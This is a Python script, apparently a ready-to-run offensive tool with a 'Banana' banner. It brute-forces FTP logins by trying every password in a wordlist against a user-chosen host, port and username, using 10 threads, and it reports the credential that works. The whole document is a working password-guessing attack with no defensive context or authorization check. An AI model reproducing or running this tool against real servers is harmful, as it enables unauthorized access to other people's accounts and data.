import ftplib
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import os

os.system("clear")

print(r"""
  ___                           
 | _ ) __ _ _ _  __ _ _ _  __ _ 
 | _ \/ _` | ' \/ _` | ' \/ _` |
 |___/\__,_|_||_\__,_|_||_\__,_|

""")

target = input("📍 Target IP or Hostname: ")

while True:
    port_input = input("📡 Target Port (2 or 4 digits, e.g. 21 or 2121): ")
    if not port_input.isdigit():
        print("❌ Please enter only numbers.")
        continue
    length = len(port_input)
    port = int(port_input)
    if length == 2 and 1 <= port <= 99:
        break
    elif length == 4 and 1000 <= port <= 9999:
        break
    else:
        print("❌ Port must be 2 digits (1-99) or 4 digits (1000-9999).")

username = input("👤 FTP Username (leave blank for anonymous): ")
if username.strip() == "":
    username = "anonymous"

choice = input("📂 Use ready-made passlist.txt? (y/n): ").lower()
if choice == "y":
    passlist_path = "passlist.txt"
else:
    passlist_path = input("📁 Enter your password list path: ")

try:
    with open(passlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = f.read().splitlines()
except FileNotFoundError:
    print(f"❌ Password list not found at '{passlist_path}'")
    exit()

print(f"\n🚀 Testing all passwords in the list on {target}:{port} as {username}...\n")

found_event = threading.Event()

def try_password(pw):
    if found_event.is_set():
        return None
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=5)
        ftp.login(user=username, passwd=pw)
        ftp.quit()
        found_event.set()
        return pw
    except ftplib.error_perm:
        return None
    except Exception:
        return None

max_workers = 10

with ThreadPoolExecutor(max_workers=max_workers) as executor:
    futures = {executor.submit(try_password, pw): pw for pw in passwords}
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(f"\n✅ Success! Username: {username} | Password: {result}")
            # executor.shutdown(wait=False) # opsiyonel, çünkü with bloğu sonrası kapanır
            break
    else:
        print("\n❌ Password not found in list.")
